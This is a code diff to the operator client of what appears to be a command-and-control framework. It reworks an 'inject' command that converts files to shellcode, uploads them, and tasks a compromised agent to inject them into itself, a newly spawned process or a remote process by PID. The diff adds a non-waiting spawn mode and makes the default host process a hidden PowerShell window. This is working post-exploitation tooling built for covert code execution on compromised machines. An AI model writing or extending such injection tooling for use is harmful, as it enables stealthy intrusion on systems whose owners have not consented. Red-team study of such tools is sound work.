@@ -3,6 +3,8 @@ using Commander.Commands;
 using Commander.Communication;
 using Commander.Executor;
 using Commander.Terminal;
+using Common;
+using Common.Payload;
 using System;
 using System.Collections.Generic;
 using System.CommandLine;
@@ -21,6 +23,7 @@ namespace Commander
         public string processName { get; set; }
         public int? processId { get; set; }
 
+        public bool x86 { get; set; }
         public string base64Params { get; set; }
         public bool raw { get; set; }
         public bool verbose { get; set; }
@@ -48,12 +51,13 @@ namespace Commander
 
         public override RootCommand Command => new RootCommand(this.Description)
         {
-            new Argument<string>("injectionType", "Type of injection").FromAmong("self", "spawn", "remote"),
+            new Argument<string>("injectionType", "Type of injection").FromAmong("self", "spawn", "remote", "spawn-nowait"),
             new Argument<string>("fileToInject", "path of the file to inject"),
             new Argument<string>("parameters", () => string.Empty, "parameters to use"),
-            new Option<string>(new[] { "--processName", "-p" }, () => "cmd.exe" ,"process name to start."),
+            new Option<string>(new[] { "--processName", "-p" }, () => "powershell -WindowStyle Hidden" ,"process name to start."),
             new Option<int?>(new[] { "--processId", "-i" }, "process id to inject to."),
             new Option<string>(new[] { "--base64Params", "-b64" }, "params B64 encoded."),
+            new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
             new Option(new[] { "--raw", "-r" }, "inject the raw file"),
             new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
         };
@@ -66,7 +70,7 @@ namespace Commander
             if (!context.Options.raw)
             {
                 var parms = this.ComputeParams(context.Options.parameters);
-                if(!string.IsNullOrEmpty(context.Options.base64Params))
+                if (!string.IsNullOrEmpty(context.Options.base64Params))
                 {
                     var decodedBytes = Convert.FromBase64String(context.Options.base64Params);
                     parms = Encoding.ASCII.GetString(decodedBytes);
@@ -74,11 +78,11 @@ namespace Commander
 
                 context.Terminal.WriteLine($"Generating payload with params {parms}...");
 
-                var result = GenerateBin(context.Options.fileToInject, parms, out binFileName);
+                var generator = new PayloadGenerator(context.Config.PayloadConfig, context.Config.SpawnConfig);
+                binFileName = Path.Combine(context.Config.PayloadConfig.WorkingFolder, ShortGuid.NewGuid() + ".bin");
+                var result = generator.GenerateBin(context.Options.fileToInject, binFileName, context.Options.x86 ,parms);
                 if (context.Options.verbose)
-                    context.Terminal.WriteLine(result);
-
-                
+                    context.Terminal.WriteLine(result.Out);
             }
             else
             {
@@ -87,7 +91,7 @@ namespace Commander
 
             context.Terminal.WriteLine($"Pushing {binFileName} to the server...");
             byte[] fileBytes = null;
-           
+
             using (FileStream fs = File.OpenRead(binFileName))
             {
                 fileBytes = new byte[fs.Length];
@@ -99,12 +103,7 @@ namespace Commander
                 context.Terminal.WriteLine($"Shellcode size = {fileBytes.Length}");
             }
 
-            bool first = true;
-            var fileId = await context.CommModule.Upload(fileBytes, binFileName, a =>
-            {
-                context.Terminal.ShowProgress("uploading", a, first);
-                first = false;
-            });
+            var fileId = await context.UploadAndDisplay(fileBytes, binFileName);
 
             if (!context.Options.raw)
             {
@@ -113,13 +112,17 @@ namespace Commander
 
             string fileName = Path.GetFileName(binFileName);
 
-            if(context.Options.injectionType.Equals("spawn"))
+            if (context.Options.injectionType.Equals("spawn-nowait"))
             {
                 await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "inject-spawn", fileId, fileName, $"{context.Options.processName}");
             }
-            else if(context.Options.injectionType == "remote")
+            else if (context.Options.injectionType == "spawn")
             {
-                if(!context.Options.processId.HasValue)
+                await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "inject-spawn-wait", fileId, fileName, $"{context.Options.processName}");
+            }
+            else if (context.Options.injectionType == "remote")
+            {
+                if (!context.Options.processId.HasValue)
                 {
                     context.Terminal.WriteError("A processId is required.");
                     return false;
@@ -131,23 +134,10 @@ namespace Commander
                 await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "inject-self", fileId, fileName);
             }
 
-            context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {context.Executor.CurrentAgent.Metadata.ShortId}.");
+            context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {context.Executor.CurrentAgent.Metadata.Id}.");
             return true;
         }
 
-
-        public static string GetRandomName()
-        {
-            return Guid.NewGuid().ToString();
-        }
-
-        public static string GenerateBin(string inputPath, string parameters, out string binPath)
-        {
-            var name = Path.Combine(TmpFolder, GetRandomName() + ".bin");
-            string ret = Internal.BinMaker.GenerateBin(inputPath, name, parameters);
-            binPath = name;
-            return ret;
-        }
 
 
     }
